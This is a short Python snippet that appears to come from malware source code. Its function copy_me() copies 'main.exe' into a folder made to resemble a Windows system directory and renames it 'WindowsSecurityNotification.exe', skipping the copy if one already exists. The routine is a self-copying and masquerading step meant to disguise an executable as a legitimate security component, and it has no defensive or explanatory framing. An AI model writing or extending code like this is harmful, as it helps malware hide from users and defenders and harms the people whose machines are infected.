from shutil import copyfile, copy
import os

new_path = r"C:\System32\x25x02x42"  # copy path
name_file = "WindowsSecurityNotification.exe"  # new filename


def copy_me():
    """
        copy file to root directory
    """
    # check if the file was created earlier
    if "WindowsSecurityNotification.exe" in os.listdir(r"C:\System32\x25x02x42"):
        return 1

    copyfile("main.exe", os.path.join(new_path, name_file))
